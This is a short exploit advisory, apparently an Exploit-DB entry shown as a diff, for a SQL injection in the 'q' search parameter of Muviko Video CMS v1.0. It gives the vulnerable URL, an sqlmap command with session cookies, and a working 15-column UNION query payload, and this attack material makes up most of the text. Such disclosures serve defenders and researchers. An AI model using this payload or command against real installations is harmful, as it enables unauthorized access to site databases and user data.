@@ -1,0 +1,31 @@
+Exploit Title: Muviko - Video CMS v1.0 – 'q' Parameter SQL Injection
+Date: 02.08.2017
+Vendor Homepage: https://muvikoscript.com/
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+Muviko is a movie & video content management system. 
+Powerful, scalable and multi-purpose. 
+It has been built from the ground up to provide users with an excellent experience. 
+Uses can subscribe to watch your videos and earn you money. 
+You choose which of your videos require users to subscribe, and which are free. 
+You can also earn money from Ads.
+
+
+Vulnerable Url: https://localhost/search.php?q=[payload]
+
+Sqlmap Example : sqlmap.py -u "https://localhost/search.
+php?q=star" --cookie="PHPSESSID=ipqrq203upp0kshdetjgn2hk12; _ga=GA1.2.1947531638
+.1501703867; _gid=GA1.2.1749506565.1501703867; _gat=1"
+
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: q=test' UNION ALL SELECT NULL,CONCAT(CONCAT('qqpzq','lHGBmBgXqPlXdk
+uRCaimornRFWRUtWPKLWYLzQeK'),'qqvvq'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NU
+LL,NULL,NULL,NULL,NULL-- Gqvt
+---
